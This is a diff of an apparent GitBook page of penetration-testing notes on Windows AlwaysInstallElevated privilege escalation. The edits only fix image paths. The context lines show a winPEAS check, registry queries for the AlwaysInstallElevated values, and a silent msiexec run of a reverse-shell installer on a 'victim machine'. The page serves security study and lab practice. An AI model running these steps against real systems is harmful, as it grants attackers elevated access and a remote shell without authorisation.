@@ -10,7 +10,7 @@ Use winPEAS to see if both registry values are set:
 winPEASany.exe quiet windowscreds
 ```
 
-![](../../../../../.gitbook/assets/image%20%28146%29.png)
+![](../../../../.gitbook/assets/image%20%28146%29.png)
 
 Alternatively, verify the values manually:
 
@@ -19,7 +19,7 @@ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 ```
 
-![](../../../../../.gitbook/assets/image%20%28151%29.png)
+![](../../../../.gitbook/assets/image%20%28151%29.png)
 
 {% hint style="info" %}
 note that both of these registry key values should be set to 1. otherwise we cant use this attack vector.
@@ -37,7 +37,7 @@ send the reverse shell to victim machine and run the installer with msiexec:
 msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
 ```
 
-![](../../../../../.gitbook/assets/image%20%28147%29.png)
+![](../../../../.gitbook/assets/image%20%28147%29.png)
 
 
 
